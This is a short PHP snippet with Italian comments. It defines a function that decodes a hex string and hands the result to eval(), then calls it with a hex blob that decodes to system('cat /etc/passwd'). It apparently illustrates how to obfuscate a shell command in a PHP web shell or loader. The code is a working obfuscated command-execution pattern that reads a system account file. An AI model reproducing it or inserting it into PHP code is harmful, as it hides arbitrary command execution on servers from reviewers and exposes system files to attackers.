<?php
// Funzione che accetta HEX
function dcd($hex){
// Splitta il valore, quindi cicla ogni carattere
for ($i=0; $i < strlen($hex)-1; $i+=2){ 
// Converti i valori da HEX a decimale, quindi in ASCII
$string .= chr(hexdec($hex[$i].$hex[$i+1])); 
} 
// Esegui la funzione 
eval($string); 
} 
dcd('73797374656d2827636174202f6574632f70617373776427293b'); 
?>